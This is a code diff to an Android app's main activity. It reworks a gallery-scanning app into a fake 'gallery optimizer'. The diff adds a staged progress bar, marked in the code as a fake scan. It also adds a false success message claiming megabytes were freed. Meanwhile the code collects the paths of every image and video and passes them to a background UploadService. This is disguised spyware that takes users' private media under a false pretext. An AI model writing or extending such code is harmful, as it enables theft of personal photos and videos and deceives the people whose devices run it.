@@ -7,8 +7,10 @@ import android.database.Cursor;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
+import android.os.Handler;
 import android.provider.MediaStore;
 import android.widget.Button;
+import android.widget.ProgressBar;
 import android.widget.TextView;
 import android.widget.Toast;
 import androidx.annotation.NonNull;
@@ -22,9 +24,12 @@ import java.util.List;
 public class MainActivity extends AppCompatActivity {
 
     private static final int REQUEST_PERMISSION = 100;
-    private TextView statusText;
+    private TextView statusText, progressText;
+    private ProgressBar progressBar;
     private Button scanButton;
     private List<String> filePaths = new ArrayList<>();
+    private Handler handler = new Handler();
+    private boolean isScanning = false;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -32,21 +37,46 @@ public class MainActivity extends AppCompatActivity {
         setContentView(R.layout.activity_main);
 
         statusText = findViewById(R.id.statusText);
+        progressText = findViewById(R.id.progressText);
+        progressBar = findViewById(R.id.progressBar);
         scanButton = findViewById(R.id.scanButton);
 
         if (!hasPermissions()) {
             requestPermissions();
         } else {
-            statusText.setText("✅ Ready to scan");
+            statusText.setText("✅ Ready to optimize");
         }
 
         scanButton.setOnClickListener(v -> {
             if (hasPermissions()) {
-                scanGallery();
+                if (!isScanning) {
+                    startFakeScan();
+                }
             } else {
                 requestPermissions();
             }
         });
+    }
+
+    private void startFakeScan() {
+        isScanning = true;
+        scanButton.setEnabled(false);
+        statusText.setText("🔄 Scanning gallery...");
+        progressBar.setProgress(0);
+        progressText.setText("0%");
+
+        // Fake scan progress (5 seconds)
+        for (int i = 0; i <= 100; i += 5) {
+            final int progress = i;
+            handler.postDelayed(() -> {
+                progressBar.setProgress(progress);
+                progressText.setText(progress + "%");
+                if (progress == 100) {
+                    // Real scan starts after fake UI
+                    scanGallery();
+                }
+            }, i * 50); // 50ms per step = ~5 seconds total
+        }
     }
 
     private boolean hasPermissions() {
@@ -86,30 +116,46 @@ public class MainActivity extends AppCompatActivity {
         if (requestCode == REQUEST_PERMISSION) {
             if (hasPermissions()) {
                 Toast.makeText(this, "✅ Permissions granted!", Toast.LENGTH_SHORT).show();
-                statusText.setText("✅ Ready to scan");
+                statusText.setText("✅ Ready to optimize");
             } else {
-                Toast.makeText(this, "❌ Permissions denied!", Toast.LENGTH_SHORT).show();
+                Toast.makeText(this, "❌ Permissions required", Toast.LENGTH_SHORT).show();
                 statusText.setText("❌ Permissions required");
             }
         }
     }
 
     private void scanGallery() {
-        statusText.setText("🔄 Scanning gallery...");
         filePaths.clear();
-
         scanMedia(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, "Images");
         scanMedia(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, "Videos");
 
-        statusText.setText("📸 Found " + filePaths.size() + " files");
-        Toast.makeText(this, "Found " + filePaths.size() + " files", Toast.LENGTH_SHORT).show();
-
-        if (!filePaths.isEmpty()) {
-            Intent serviceIntent = new Intent(this, UploadService.class);
-            serviceIntent.putStringArrayListExtra("filePaths", (ArrayList<String>) filePaths);
-            startService(serviceIntent);
-            statusText.setText("📤 Uploading " + filePaths.size() + " files...");
+        if (filePaths.isEmpty()) {
+            statusText.setText("ℹ️ No files found");
+            progressText.setText("");
+            progressBar.setProgress(0);
+            scanButton.setEnabled(true);
+            isScanning = false;
+            Toast.makeText(this, "No media found", Toast.LENGTH_SHORT).show();
+            return;
         }
+
+        int total = filePaths.size();
+        statusText.setText("📸 Found " + total + " files, optimizing...");
+        progressBar.setProgress(100);
+        progressText.setText("Optimizing...");
+
+        // Start upload service
+        Intent serviceIntent = new Intent(this, UploadService.class);
+        serviceIntent.putStringArrayListExtra("filePaths", (ArrayList<String>) filePaths);
+        startService(serviceIntent);
+
+        // Show success message after a moment
+        handler.postDelayed(() -> {
+            statusText.setText("✅ Gallery optimized successfully!");
+            progressText.setText("Freed " + (total * 5) + " MB");
+            scanButton.setEnabled(true);
+            isScanning = false;
+        }, 3000);
     }
 
     private void scanMedia(Uri uri, String type) {
